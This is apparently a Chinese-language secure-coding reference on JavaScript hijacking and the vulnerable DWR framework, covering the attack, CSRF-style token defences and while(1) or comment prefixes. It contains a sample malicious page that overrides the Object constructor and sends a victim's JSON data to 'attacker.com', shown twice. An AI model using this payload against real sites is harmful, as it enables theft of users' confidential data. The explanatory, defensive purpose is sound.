<p>示例 1：在以下示例中，开头显示了一个在 Web 应用程序的客户端和服务器组件之间进行的合法 JSON 交互，这一 Web 应用程序用于管理潜在商机。接下来，它说明了攻击者如何模仿客户端获取服务器端返回的机密信息。注意，本例子是专为基于 Mozilla 的浏览器而编写的代码。若在创建对象时，没有使用 new 运算符，则其他主流浏览器会禁止重载默认构造函数。</p>
<p>客户端向服务器请求数据，并通过以下代码评估 JSON 结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>当代码运行时，会生成一个如下所示的 HTTP 请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /object.json HTTP/1.1</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Host: www.example.com</span><br><span class="line"></span><br><span class="line">Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR</span><br></pre></td></tr></table></figure>
<p>（在本 HTTP 响应和随后的响应中，我们省略了与该解释没有直接关系的 HTTP 头信息。） 服务器使用 JSON 格式的数组进行响应：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Cache-control: private</span><br><span class="line"></span><br><span class="line">Content-Type: text/javascript; charset=utf-8</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[&#123;&quot;fname&quot;:&quot;Brian&quot;, &quot;lname&quot;:&quot;Chess&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:60000.00, &quot;email&quot;:&quot;brian@example.com&quot; &#125;,</span><br><span class="line"></span><br><span class="line"> &#123;&quot;fname&quot;:&quot;Katrina&quot;, &quot;lname&quot;:&quot;O&apos;Neil&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:120000.00, &quot;email&quot;:&quot;katrina@example.com&quot; &#125;,</span><br><span class="line"></span><br><span class="line"> &#123;&quot;fname&quot;:&quot;Jacob&quot;, &quot;lname&quot;:&quot;West&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:45000.00, &quot;email&quot;:&quot;jacob@example.com&quot; &#125;]</span><br></pre></td></tr></table></figure>
<p>这种情况下，JSON 中包含了与当前用户相关的机密信息（一组潜在商机数据）。其他用户如果不知道该用户的会话标识符，便无法访问这些信息。（在大多数现代 Web 应用程序中，会话标识符存储在 cookie 中。）然而，如果受害者访问某个恶意网站，恶意网站就可以使用 JavaScript 劫持提取信息。如果受害者受到欺骗后，访问包含以下恶意代码的网页，受害者的重要信息就会被发送到攻击者的网站中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">`&lt;script&gt;`</span><br><span class="line"></span><br><span class="line">// override the constructor used to create all objects so</span><br><span class="line"></span><br><span class="line">// that whenever the &quot;email&quot; field is set, the method</span><br><span class="line"></span><br><span class="line">// captureObject() will run. Since &quot;email&quot; is the final field,</span><br><span class="line"></span><br><span class="line">// this will allow us to steal the whole object.</span><br><span class="line"></span><br><span class="line">function Object() &#123;</span><br><span class="line"></span><br><span class="line"> this.email setter = captureObject;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">// Send the captured object back to the attacker&apos;s Web site</span><br><span class="line"></span><br><span class="line">function captureObject(x) &#123;</span><br><span class="line"></span><br><span class="line">  var objString = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">  for (fld in this) &#123;</span><br><span class="line"></span><br><span class="line">    objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  objString += &quot;email: &quot; + x;</span><br><span class="line"></span><br><span class="line">  var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">  req.open(&quot;GET&quot;, &quot;http://attacker.com?obj=&quot; +</span><br><span class="line"></span><br><span class="line">           escape(objString),true);</span><br><span class="line"></span><br><span class="line">  req.send(null);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!-- Use a script tag to bring in victim&apos;s data --&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;http://www.example.com/object.json&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>恶意代码使用脚本标签以在当前页面包含 JSON 对象。Web 浏览器将使用该请求发送相应的会话 cookie。换言之，处理此请求时将认为其源自合法应用程序。</p>
<p>当 JSON 阵列到达客户端时，将在恶意页面的上下文中对其进行评估。为了看清 JSON 的评估，恶意页面重新定义了用于创建新对象的 JavaScript 功能。通过此方法，恶意代码已插入一个钩子，该钩子允许其访问每个对象的创建并将对象的内容传递回恶意网站。与之相反，其他攻击可能会覆盖阵列默认的构造函数。为在混合应用中使用而建的应用程序有时会在每一 JavaScript 消息的末端调用回调功能。回调功能意味着将由混合应用中的其他应用程序定义。回调功能使 JavaScript 挟持攻击变得容易 – 攻击者要做的就是定义该功能。应用程序可以是混合应用 - 友好型或安全型，但不可能两者兼备。如果用户未登录到易受攻击的网站，攻击者可以要求用户登录，然后显示该应用程序的合法登录页面。</p>
<p>这不是钓鱼攻击 – 攻击者未获得用户凭证的访问权限 – 因此反钓鱼对策将无法打败攻击。更复杂的攻击可能会通过使用 JavaScript 动态生成脚本标签，向应用程序作出一系列请求。此相同技术有时会用于创建应用程序混合应用。唯一的不同是，在此混合应用情况中，涉及的应用程序之一是恶意的。</p>
<h5 id="RECOMMENDATIONS-118"><a href="#RECOMMENDATIONS-118" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>所有使用 JavaScript 进行交流的程序需要采取以下防范措施：1) 拒绝恶意请求：— 在每个返回给 JavaScript 的请求中使用一些令人难以猜测的标识符，如会话标识符。允许服务器验证请求的来源可以防范跨站点请求的伪装攻击。2) 避免直接执行 JavaScript 响应：包括某些响应中的字符，这些响应只有经过了修改，才能成功地转到 JavaScript 解释器进行处理。这样可以防止攻击者使用 <code>&lt;script&gt;</code> 标签看清 JavaScript 的执行过程。防范 JavaScript 劫持的最佳方法是同时采取上述两种防范策略。</p>
<p>拒绝恶意请求 从服务器的角度来看，JavaScript 劫持攻击类似于跨站点伪装请求，因此，防止跨站点伪装请求也就可以防止 JavaScript 劫持攻击。为了便于探测各种恶意请求，每个请求均应包含攻击者难以猜测的参数。一种方法是将会话 cookie 作为参数添加到请求中。服务器接收到这样一个请求时，它可以检查并确定会话 cookie 是否与请求中的参数值匹配。恶意代码无法取得会话 cookie（cookie 也需要遵循同源策略 (Same Origin Policy)），因此，攻击者即使制造了请求，也很难再通过检验了。也可以使用其他机密信息代替会话 cookie；只要这个机密信息难以猜测，可以在合法应用程序能够访问的上下文中使用，同时又无法通过其他的域进行访问，就可以防止攻击者制造有效的请求。</p>
<p>有一些框架仅能运行在客户端上。换言之，它们完全由 JavaScript 编写而成，对服务器的工作情况一无所知。这意味着它们并不知道会话 cookie 的名称。即使并不清楚会话 cookie 的名称，它们也能参与基于 cookie 的防范，途径就是将所有的 cookie 附加到发送给服务器的各个请求中。</p>
<p>例 2：以下 JavaScript 片段描述了这种“盲客户端”策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var httpRequest = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">var cookies=&quot;cookies=&quot;+escape(document.cookie);</span><br><span class="line"></span><br><span class="line">http_request.open(&apos;POST&apos;, url, true);</span><br><span class="line"></span><br><span class="line">httpRequest.send(cookies);</span><br></pre></td></tr></table></figure>
<p>服务器也可以检查 HTTP referer 头信息，以确保请求来自于合法的应用程序，而不是恶意的应用程序。从历史上看，referer 头信息一直都未受到过信任，因此，我们并不建议您将它作为安全机制的基础。您可以为服务器装入一种针对 JavaScript hijacking 的防范方法，即让服务器只对 HTTP POST 请求做出响应，而不回应任何 HTTP GET 请求。这是一项防御技术，原因是 <code>&lt;script&gt;</code> 标签通常使用 GET 方法从外部资源文件中加载 JavaScript。然而，这种防范措施并非尽善尽美。Web 应用程序的专家一致鼓励采用 GET 方法提高性能。如果在 HTTP 方法的选择上缺乏安全方面的考虑，这意味着未来的某一时刻，程序员可能会误认为这种功能上的不足是疏忽所致，而没有将它作为一种安全预警加以认识，进而修改了应用程序以响应 GET 请求。</p>
<p>防止直接执行响应 为了使恶意站点无法执行包含 JavaScript 的响应，合法的客户端应用程序可以利用允许执行前对接收的数据进行修改这一权限，而恶意的应用程序则只能使用 <code>&lt;script&gt;</code> 标签执行响应。当服务器序列化某个对象时，该对象应包括一个前缀（也可以是后缀），从而使它无法通过<code>&lt;script&gt;</code> 标签执行 JavaScript。合法的客户端应用程序可以在运行 JavaScript 前删除这些无关的数据。</p>
<p>例 3：该方法可以通过多种方式来实现。以下例子演示了两种方式。第一种，服务器可以把以下指令作为消息的前缀：</p>
<p>while(1);</p>
<p>除非客户端删除这些前缀，否则对这个消息求值将把 JavaScript 解释器发送到一个无限的循环中。客户端搜索并删除如下前缀：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    if (txt.substr(0,9) == &quot;while(1);&quot;) &#123;</span><br><span class="line"></span><br><span class="line">      txt = txt.substring(10);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>第二种，服务器可以在 JavaScript 附近加注注释字符，这些注释字符必须在 JavaScript 被送往 eval() 函数前删除。以下 JSON 对象已加入了一块注释：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"></span><br><span class="line">[&#123;&quot;fname&quot;:&quot;Brian&quot;, &quot;lname&quot;:&quot;Chess&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:60000.00, &quot;email&quot;:&quot;brian@example.com&quot; &#125;</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p>客户端可以搜索并删除如下注释字符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    if (txt.substr(0,2) == &quot;/*&quot;) &#123;</span><br><span class="line"></span><br><span class="line">      txt = txt.substring(2, txt.length - 2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>任何通过 <code>&lt;script&gt;</code> 标签来提取敏感 JavaScript 的恶意站点都将无法获取其中所包含的数据。</p>
<p>自第 5 版 EcmaScript 起，已不可能攻击 JavaScript 数组构造函数。</p>
<h5 id="REFERENCES-116"><a href="#REFERENCES-116" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] B. Chess, Y. O’Neil, and J. West JavaScript Hijacking</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-003300 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-003300 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-003300 CAT II</p>
<p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[9] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="JavaScript-Hijacking-Vulnerable-Framework"><a href="#JavaScript-Hijacking-Vulnerable-Framework" class="headerlink" title="JavaScript Hijacking: Vulnerable Framework"></a>JavaScript Hijacking: Vulnerable Framework</h4><h5 id="ABSTRACT-118"><a href="#ABSTRACT-118" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>运行在 DWR Ajax framework 1.1.4 或更早版本上的应用程序容易受到 JavaScript hijacking 攻击，这将使一个未经授权的攻击者能够查看到机密信息。</p>
<h5 id="EXPLANATION-119"><a href="#EXPLANATION-119" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>DWR 的所有发行版本，包括 1.1.4 及之前的版本，都容易受到 JavaScript hijacking 攻击 [1]。直到现在，这个框架还没有建立任何防范该漏洞的机制。好消息是 DWR 2.0 能够利用一个用来防范跨站点伪装请求的机制来防范 JavaScript hijacking 攻击。由于恶意脚本无法读取由其他域设置的 cookie 中所存储的机密信息，该保护机制就利用了这一点，允许框架将 cookie 中存储的值作为在客户端和服务器端之间共享的机密信息。DWR 2.0 会自动在客户端为请求追加会话 cookie，并在服务器上验证每项请求是否均包含正确的值。</p>
<p>如果发生以下情况，应用程序可能会很容易受到 JavaScript 劫持的攻击：1) 将 JavaScript 对象用作数据传输格式 2) 处理机密数据。由于 JavaScript 劫持漏洞不会作为编码错误的直接结果出现，所以 Fortify 安全编码规则包会通过识别在 HTTP 响应中产生的 JavaScript 代码，引起人们对潜在的 JavaScript 劫持漏洞的注意。</p>
<p>Web 浏览器执行同源策略 (Same Origin Policy)，以保护用户免受恶意网站的攻击。同源策略 (Same Origin Policy) 规定：如果要使用 JavaScript 来访问某个网页的内容的话，则 JavaScript 和网页必须都来源于相同的域。若不采取同源策略 (Same Origin Policy)，恶意网站便可以使用客户端凭证来运行 JavaScript，从其他网站加载的敏感信息，并对这些信息进行提炼，然后将其返回给攻击者。通过 JavaScript 劫持，攻击者可以绕过 Web 应用程序中使用的同源策略 (Same Origin Policy)，该应用程序使用 JavaScript 来交流机密信息。同源策略 (Same Origin Policy) 中的漏洞是：通过这一策略，任何网站的 JavaScript 都可以被其他网站的上下文包含或执行。即使恶意网站不能直接在客户端上检查易受攻击的站点中加载的所有数据，但它仍可以通过配置一个特定的环境利用该漏洞。有了这样的环境，恶意网站就可以监视 JavaScript 的执行过程和任何可能发生的相关负面效应。由于许多 Web 2.0 应用程序使用 JavaScript 作为数据传输机制，因此，与传统的 Web 应用程序不同，它们往往很容易受到各种攻击。</p>
<p>JavaScript 中最常见的信息传输格式为 JavaScript Object Notation (JSON)。JSON RFC 将 JSON 语法定义为 JavaScript 类实例文本化定义语法 (object literal syntax)的子集。JSON 基于两种数据结构类型：阵列和对象。所有可以作为一个或多个有效 JavaScript 语句进行解析的数据传送格式都容易受到 JavaScript 劫持的攻击。JSON 使 JavaScript 劫持变得更加容易，因为 JSON 数组坚持认为它自己就是有效的 JavaScript 指令。因为数组是交换列表的一种正常形式，在应用程序需要交换多个值时会普遍使用该形式。换句话说，一个 JSON 数组会直接受到 JavaScript 劫持的攻击。一个 JSON 对象只在其被一些其他 JavaScript 结构包围时才会受到攻击，这些 JavaScript 结构坚持认为它们自己就是有效的 JavaScript 指令。</p>
<p>示例 1：在以下示例中，开头显示了一个在 Web 应用程序的客户端和服务器组件之间进行的合法 JSON 交互，这一 Web 应用程序用于管理潜在商机。接下来，它说明了攻击者如何模仿客户端获取服务器端返回的机密信息。注意，本例子是专为基于 Mozilla 的浏览器而编写的代码。若在创建对象时，没有使用 new 运算符，则其他主流浏览器会禁止重载默认构造函数。</p>
<p>客户端向服务器请求数据，并通过以下代码评估 JSON 结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>当代码运行时，会生成一个如下所示的 HTTP 请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /object.json HTTP/1.1</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Host: www.example.com</span><br><span class="line"></span><br><span class="line">Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR</span><br></pre></td></tr></table></figure>
<p>（在本 HTTP 响应和随后的响应中，我们省略了与该解释没有直接关系的 HTTP 头信息。） 服务器使用 JSON 格式的数组进行响应：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Cache-control: private</span><br><span class="line"></span><br><span class="line">Content-Type: text/javascript; charset=utf-8</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[&#123;&quot;fname&quot;:&quot;Brian&quot;, &quot;lname&quot;:&quot;Chess&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:60000.00, &quot;email&quot;:&quot;brian@example.com&quot; &#125;,</span><br><span class="line"></span><br><span class="line"> &#123;&quot;fname&quot;:&quot;Katrina&quot;, &quot;lname&quot;:&quot;O&apos;Neil&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:120000.00, &quot;email&quot;:&quot;katrina@example.com&quot; &#125;,</span><br><span class="line"></span><br><span class="line"> &#123;&quot;fname&quot;:&quot;Jacob&quot;, &quot;lname&quot;:&quot;West&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:45000.00, &quot;email&quot;:&quot;jacob@example.com&quot; &#125;]</span><br></pre></td></tr></table></figure></p>
<p>这种情况下，JSON 中包含了与当前用户相关的机密信息（一组潜在商机数据）。其他用户如果不知道该用户的会话标识符，便无法访问这些信息。（在大多数现代 Web 应用程序中，会话标识符存储在 cookie 中。）然而，如果受害者访问某个恶意网站，恶意网站就可以使用 JavaScript 劫持提取信息。如果受害者受到欺骗后，访问包含以下恶意代码的网页，受害者的重要信息就会被发送到攻击者的网站中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">`&lt;script&gt;`</span><br><span class="line"></span><br><span class="line">// override the constructor used to create all objects so</span><br><span class="line"></span><br><span class="line">// that whenever the &quot;email&quot; field is set, the method</span><br><span class="line"></span><br><span class="line">// captureObject() will run. Since &quot;email&quot; is the final field,</span><br><span class="line"></span><br><span class="line">// this will allow us to steal the whole object.</span><br><span class="line"></span><br><span class="line">function Object() &#123;</span><br><span class="line"></span><br><span class="line"> this.email setter = captureObject;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">// Send the captured object back to the attacker&apos;s Web site</span><br><span class="line"></span><br><span class="line">function captureObject(x) &#123;</span><br><span class="line"></span><br><span class="line">  var objString = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">  for (fld in this) &#123;</span><br><span class="line"></span><br><span class="line">    objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  objString += &quot;email: &quot; + x;</span><br><span class="line"></span><br><span class="line">  var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">  req.open(&quot;GET&quot;, &quot;http://attacker.com?obj=&quot; +</span><br><span class="line"></span><br><span class="line">           escape(objString),true);</span><br><span class="line"></span><br><span class="line">  req.send(null);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!-- Use a script tag to bring in victim&apos;s data --&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;http://www.example.com/object.json&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>恶意代码使用脚本标签以在当前页面包含 JSON 对象。Web 浏览器将使用该请求发送相应的会话 cookie。换言之，处理此请求时将认为其源自合法应用程序。</p>
<p>当 JSON 阵列到达客户端时，将在恶意页面的上下文中对其进行评估。为了看清 JSON 的评估，恶意页面重新定义了用于创建新对象的 JavaScript 功能。通过此方法，恶意代码已插入一个钩子，该钩子允许其访问每个对象的创建并将对象的内容传递回恶意网站。与之相反，其他攻击可能会覆盖阵列默认的构造函数。为在混合应用中使用而建的应用程序有时会在每一 JavaScript 消息的末端调用回调功能。回调功能意味着将由混合应用中的其他应用程序定义。回调功能使 JavaScript 挟持攻击变得容易 – 攻击者要做的就是定义该功能。应用程序可以是混合应用 - 友好型或安全型，但不可能两者兼备。如果用户未登录到易受攻击的网站，攻击者可以要求用户登录，然后显示该应用程序的合法登录页面。</p>
